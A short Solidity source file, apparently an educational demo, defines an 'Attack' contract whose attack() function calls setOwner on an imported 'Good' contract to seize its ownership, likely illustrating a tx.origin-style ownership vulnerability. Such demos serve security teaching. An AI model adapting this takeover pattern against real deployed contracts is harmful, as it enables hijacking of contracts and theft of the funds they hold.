//SPDX-License-Identifier: MIT

import "./Good.sol";

contract Attack {
    Good public good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
